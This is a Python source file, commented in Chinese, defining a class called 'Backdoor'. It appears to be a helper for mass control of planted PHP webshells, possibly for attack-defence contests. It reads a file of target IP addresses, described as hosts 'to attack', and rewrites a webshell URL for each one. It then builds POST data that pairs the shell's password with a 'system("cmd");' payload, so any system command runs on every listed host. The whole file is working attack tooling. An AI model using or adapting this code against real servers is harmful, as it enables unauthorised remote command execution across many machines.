import re
from urllib.parse import urlparse, parse_qs


class Backdoor:
    FileAddress = ''  # 用于保存文件地址
    Url = ''  # 用于保存Url
    scheme = ''  # 协议部分
    netloc = ''  # 域名部分
    path = ''  # 地址部分
    query = ''  # 查询部分
    file_name = ''  # 文件名
    first_param_name = ''  # 查询键
    first_param_value = ''  # 查询值
    password = ''  # 连接密码
    codeCmd = ''  # 执行代码命令
    systemCmd = ''  # 执行系统命令
    all_IP = []  # 用于保存全部的IP地址
    all_Url = []  # 用于保存全部的Url
    post_data = {}  # post数据

    def printALL(self):
        """
        打印所有信息。

        该方法用于打印对象的所有属性、从文件中读取的IP地址和生成的URL列表。

        Args:
            None

        Returns:
            None

        Example:
            示例用法:
            - 调用 `printALL()` 方法来打印对象的所有信息。
        """
        self.printALLAttribute()
        self.printALL_IP()
        self.printALL_Url()

    def printALLAttribute(self):
        """
        打印对象的所有属性信息。

        Args:
            None

        Returns:
            None

        Example:
            示例用法:
            - 调用 `printAll()` 方法来打印对象的所有属性信息。
        """
        print("---------------------属性---------------------")
        print("文件地址属性: ", self.FileAddress)
        print("URL属性: ", self.Url)
        print("协议部分属性: ", self.scheme)
        print("域名部分属性: ", self.netloc)
        print("地址部分属性: ", self.path)
        print("查询部分属性: ", self.query)
        print("查询文件名：", self.file_name)
        print("查询键属性: ", self.first_param_name)
        print("查询值属性: ", self.first_param_value)
        print("连接密码属性: ", self.password)
        print("代码命令属性: ", self.codeCmd)
        print("POST数据属性：", self.post_data)
        print("系统命令属性：", self.systemCmd)
        print('----------------------------------------------')

    def printALL_IP(self):
        """
        打印所有从文件中读取的IP地址。

        该方法用于逐行打印从文件中读取的IP地址列表。

        Args:
            None

        Returns:
            None

        Example:
            示例用法:
            - 调用 `printALL_IP()` 方法来打印所有IP地址。
        """
        print("--------------------全部IP--------------------")
        for ip in self.all_IP:
            print(ip)
        print("----------------------------------------------")

    def printALL_Url(self):
        """
        打印所有生成的URL。

        该方法用于逐行打印生成的URL列表。

        Args:
            None

        Returns:
            None

        Example:
            示例用法:
            - 调用 `printALL_Url()` 方法来打印所有生成的URL。
        """
        print("-------------------全部URL--------------------")
        for url in self.all_Url:
            print(url)
        print("----------------------------------------------")

    def setCodeCmd(self, value=""):
        """
        设置执行命令。

        这个方法用于设置执行命令属性 `cmd` 的值。

        Args:
            value (str, optional): 要设置的执行命令。默认为空字符串。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `setcodeCmd()` 方法来设置执行命令属性。
        """
        self.codeCmd = value

    def setPassword(self, value=""):
        """
        设置连接密码。

        这个方法用于设置连接密码属性 `password` 的值。

        Args:
            value (str, optional): 要设置的连接密码。默认为空字符串。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `setPassword()` 方法来设置连接密码属性。
        """
        self.password = value

    def setPostValue(self):
        """
        设置POST请求参数。

        这个方法用于设置POST请求的参数，根据对象的 `password` 和 `cmd` 属性来创建参数字典。

        Args:
            None

        Returns:
            dict: 包含POST参数的字典。

        Example:
            示例用法:
            - 调用 `setPostValue()` 方法来创建POST请求的参数字典。
        """
        self.post_data = {self.password: self.codeCmd}

    def setSystemCmd(self, cmd=""):
        """
        设置执行命令。

        这个方法用于设置执行命令属性 `cmd` 的值，以便执行系统命令。

        Args:
            cmd (str, optional): 要执行的系统命令字符串。默认为空字符串。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `setCmd()` 方法并传入要执行的系统命令字符串。
        """
        self.systemCmd = rf'system("{cmd}");'

    def setUrl(self, Url):
        """
        设置URL。

        该方法用于设置对象的 URL 属性。

        Args:
            Url (str): 要设置的 URL 字符串。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `setUrl(Url)` 方法来设置对象的 URL 属性。
        """
        # 定义一个URL的正则表达式
        url_pattern = r'^(https?|ftp)://[^\s/$.?#].[^\s]*$'

        # 使用re.match()函数来检查URL是否匹配正则表达式
        if not re.match(url_pattern, Url):
            raise ValueError("错误的URL格式")

        # 如果URL格式正确，将URL赋值给对象的属性
        self.Url = Url

    def setnetloc(self, netloc):
        """
        设置域名部分。

        该方法用于设置对象的域名部分（netloc）属性。

        Args:
            netloc (str): 要设置的域名部分字符串。

        Returns:
            None

        Raises:
            Exception: 如果发生任何异常，将引发 "IP设置错误" 异常。

        Example:
            示例用法:
            - 调用 `setnetloc(netloc)` 方法来设置对象的域名部分属性。
        """
        try:
            self.netloc = netloc
        except Exception as e:
            print("IP设置错误:", str(e))

    def setanalyzeUrl(self):
        """
        分析URL，提取各个部分信息。

        这个方法用于解析给定的URL，并提取其各个部分的信息，包括协议、域名、地址、查询参数等。

        Args:
            None

        Returns:
            None

        Example:
            示例用法:
            - 调用 `analyzeUrl()` 方法来解析URL。
            - 方法将提取URL的协议、域名、地址、查询参数等信息，并将其保存到对象的属性中，以供后续使用。
        """
        if self.Url == "":
            print("先测试Url")
        # 使用urlparse解析Url
        parsed_url = urlparse(self.Url)

        # 提取Url的各个部分
        self.scheme = parsed_url.scheme  # 协议部分
        self.netloc = parsed_url.netloc  # 域名部分
        self.path = parsed_url.path      # 地址部分
        self.query = parsed_url.query    # 查询部分
        self.file_name = self.path.split("/")[-1]  # 文件名

        # 使用parse_qs解析查询字符串
        query_dict = parse_qs(self.query)

        # 获取查询参数的值
        if query_dict:
            self.first_param_name = list(query_dict.keys())[0]
            self.first_param_value = query_dict[self.first_param_name][0]

    def setSystemCmd_PostValue(self, systemCmdValue: str) -> None:
        """
        设置系统命令并创建POST请求参数。

        该方法用于设置系统命令，并根据设置的系统命令创建POST请求的参数。

        Args:
            systemCmdValue (str): 要设置的系统命令字符串。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `setSystemCmd_PostValue(systemCmdValue)` 方法来设置系统命令和创建POST请求参数。
        """
        self.setSystemCmd(systemCmdValue)
        self.setCodeCmd(self.systemCmd)
        self.setPostValue()

    def getFileAddress(self, value=''):
        """
        将从文件中读取IP地址资产。
        这个方法用于从文件中读取IP地址资产列表，文件中应包含相关的IP地址，每行一个。

        Args:
            value (str, optional): 自定义源地址。默认为空字符串。

        Returns:
            None

        Raises:
            Exception: 如果发生任何异常，将引发 "文件地址获取发生错误" 异常。

        Example:
            示例用法:
            - 创建一个文本文件，写入要攻击的IP地址。
            - 调用 `readFileAddress()` 方法来读取文件地址。
            - 当参数为空时,会自动提醒输入
        """
        try:
            if value == '':
                self.FileAddress = re.sub(r"\"", "", input("输入源地址： "))
            else:
                self.FileAddress = re.sub(r"\"", "", value)
        except Exception as e:
            print("文件地址获取发生错误", str(e))

    def readIPs(self):
        """
        从文件中读取IP地址列表。

        该方法打开指定文件并逐行读取其中的IP地址，然后将这些IP地址以列表的形式返回。

        Returns:
            List[str]: 包含从文件中读取的IP地址的列表。

        Raises:
            FileNotFoundError: 如果指定的文件不存在。
            IOError: 如果在读取文件时发生IO错误。

        Example:
            示例用法:
            - 调用 `readIPs()` 方法来读取文件中的IP地址列表。
        """
        try:
            # 打开文件并逐行读取IP地址
            with open(self.FileAddress, mode="r", encoding="utf-8") as f:
                ip_addresses = [line.strip() for line in f.readlines()]
            return ip_addresses
        except FileNotFoundError:
            raise FileNotFoundError(f"文件 '{self.FileAddress}' 不存在")
        except IOError as e:
            raise IOError(f"读取文件时发生IO错误: {str(e)}")

    def spliceUrls(self):
        """
        根据IP地址生成URL列表。

        该方法使用对象的属性（协议、路径、查询参数等）以及从文件中读取的IP地址，生成URL列表并存储在对象的属性 self.all_Url 中。

        Args:
            None

        Returns:
            None

        Example:
            示例用法:
            - 调用 `spliceUrl()` 方法来生成URL列表并存储在对象中。
        """
        urls = [
            f"{self.scheme}://{ip}{self.path}?{self.query}" for ip in self.all_IP]
        self.all_Url = urls

    def splice_IP_Url(self, IP: str):
        """
        根据给定的IP地址，构建新的URL。

        Args:
            IP (str): 要用于替换域名部分的IP地址。

        Returns:
            str: 构建的新URL字符串。

        Raises:
            ValueError: 如果IP参数无效或为空字符串。

        Example:
            示例用法:
            - 调用 `splice_IP_Url(IP)` 方法，传入要替换的IP地址。
            - 方法将返回一个新的URL字符串，其中域名部分被替换为指定的IP地址。

        """
        # 验证IP地址参数是否有效
        if not IP:
            raise ValueError("IP参数不能为空字符串")

        # 使用给定的IP地址替换域名部分，并保留其他URL组件
        new_url = f"{self.scheme}://{IP}{self.path}?{self.query}"
        return new_url

    def changeUrlFileName(self, new_file_name):
        """
        更改 URL 中的文件名。

        Args:
            new_file_name (str): 新的文件名。

        Returns:
            None

        Example:
            示例用法:
            - 调用 `changeFileName(new_file_name)` 方法来更改 URL 中的文件名。
        """
        # 使用文件名替换 URL 中的最后一个部分
        parts = self.path.split("/")
        parts[-1] = new_file_name
        self.path = "/".join(parts)
